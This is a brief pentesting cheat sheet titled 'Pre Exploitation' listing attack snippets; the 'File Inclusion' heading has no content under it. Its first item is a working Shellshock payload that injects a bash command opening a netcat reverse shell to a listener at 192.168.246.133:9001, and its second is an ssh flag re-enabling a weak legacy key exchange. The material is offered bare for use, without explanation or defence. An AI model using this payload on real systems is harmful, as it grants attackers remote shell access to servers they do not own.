# Pre Exploitation


1. Shellshock
```
() { :;};echo -e "\\r\\n$(/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.246.133 9001 >/tmp/f')"

```

2. deprecated ssh
```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1
```

3. File Inclusion
